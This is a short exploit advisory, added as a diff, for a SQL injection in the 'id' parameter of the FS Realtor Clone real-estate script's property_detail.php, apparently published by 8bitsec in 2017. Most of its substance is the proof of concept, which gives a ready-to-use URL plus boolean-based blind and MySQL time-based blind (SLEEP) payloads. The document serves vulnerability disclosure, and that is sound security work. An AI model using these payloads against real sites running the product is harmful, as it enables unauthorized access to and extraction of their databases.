@@ -1,0 +1,41 @@
+# Exploit Title: FS Realtor Clone - 'id' SQL Injection
+# Date: 2017-10-24
+# Exploit Author: 8bitsec
+# Vendor Homepage: https://fortunescripts.com/
+# Software Link: https://fortunescripts.com/product/realtor-clone/
+# Version: 24 October 17
+# Tested on: [Kali Linux 2.0 | Mac OS 10.12.6]
+# Email: contact@8bitsec.io
+# Contact: https://twitter.com/_8bitsec
+
+Release Date:
+=============
+2017-10-24
+
+Product & Service Introduction:
+===============================
+The realtor business anywhere is dependent essentially on the support provided by a robust digital platform offering diverse solutions at fingertips.
+
+Technical Details & Description:
+================================
+
+SQL injection on [id] parameter.
+
+Proof of Concept (PoC):
+=======================
+
+SQLi:
+
+https://localhost/[path]/property_detail.php?id=29 AND 4599=4599
+
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=29 AND 4599=4599
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=29 AND SLEEP(5)
+    
+==================
+8bitsec - [https://twitter.com/_8bitsec]
